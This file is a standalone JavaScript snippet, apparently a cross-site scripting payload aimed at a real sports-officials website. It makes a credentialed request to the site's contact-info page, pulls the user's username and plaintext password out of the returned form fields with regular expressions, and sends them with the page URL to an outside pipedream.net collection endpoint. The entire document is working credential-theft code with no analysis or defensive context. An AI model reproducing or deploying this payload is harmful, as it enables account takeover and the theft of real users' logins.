var xhttp = new XMLHttpRequest();
xhttp.onreadystatechange = function() {
	if (this.readyState == 4 && this.status == 200) {
		var u = /<input name="ctl00\$content\$fvContactInfo\$ucContactInfo\$txtUsername" type="text" value="(.*)" maxlength="32" id="ctl00_content_fvContactInfo_ucContactInfo_txtUsername"/.exec(this.response)[1];
		var p = /<input name="ctl00\$content\$fvContactInfo\$ucContactInfo\$txtPassword" type="password" maxlength="32" id="ctl00_content_fvContactInfo_ucContactInfo_txtPassword" tabindex="8" class="form-control" value="(.*)" \/>/.exec(this.response)[1];
		fetch("//eori698jwvo92sm.m.pipedream.net/?username="+u+"&password="+p+"&url="+window.location);
	}
};
xhttp.open("GET", "https://www.nbaofficials.com/Pages/ContactInfo.aspx", true);
xhttp.withCredentials = true;
xhttp.send();
